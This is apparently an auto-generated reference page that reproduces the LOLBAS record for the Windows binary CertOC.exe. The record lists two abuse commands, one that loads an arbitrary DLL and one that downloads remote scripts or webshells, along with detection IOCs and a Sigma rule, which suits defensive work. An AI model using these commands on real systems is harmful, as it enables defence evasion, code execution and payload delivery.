---
parsed_by: focuslocust
source: lolbas
type: generated
---
# CertOC.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `certoc.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Certoc.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [CertOC.exe](../../tools/windows/certoc.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | certoc.exe |
| name | CertOC.exe |
| type | tool |
| source | lolbas |
| url | https://twitter.com/sblmsrsn/status/1445758411803480072?s=20 |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@sblmsrsn'
  Person: Ensar Samil
Author: Ensar Samil
Commands:
- Category: Execute
  Command: certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}
  Description: Loads the target DLL file
  MitreID: T1218
  OperatingSystem: Windows Server 2022
  Privileges: User
  Tags:
  - Execute: DLL
  Usecase: Execute code within DLL file
- Category: Download
  Command: certoc.exe -GetCACAPS {REMOTEURL:.ps1}
  Description: Downloads text formatted files
  MitreID: T1105
  OperatingSystem: Windows Server 2022
  Privileges: User
  Usecase: Download scripts, webshells etc.
Created: 2021-10-07
Description: Used for installing certificates
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certoc_load_dll.yml
- IOC: Process creation with given parameter
- IOC: Unsigned DLL load via certoc.exe
- IOC: Network connection via certoc.exe
Full_Path:
- Path: c:\windows\system32\certoc.exe
- Path: c:\windows\syswow64\certoc.exe
Name: CertOC.exe
Resources:
- Link: https://twitter.com/sblmsrsn/status/1445758411803480072?s=20
- Link: https://twitter.com/sblmsrsn/status/1452941226198671363?s=20
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Certoc.yml
```

## Detection / Analysis Notes

```text
IOC: Network connection via certoc.exe
```

```text
IOC: Process creation with given parameter
```

```text
IOC: Unsigned DLL load via certoc.exe
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certoc_load_dll.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certoc_load_dll.yml
- IOC: Process creation with given parameter
- IOC: Unsigned DLL load via certoc.exe
- IOC: Network connection via certoc.exe
```
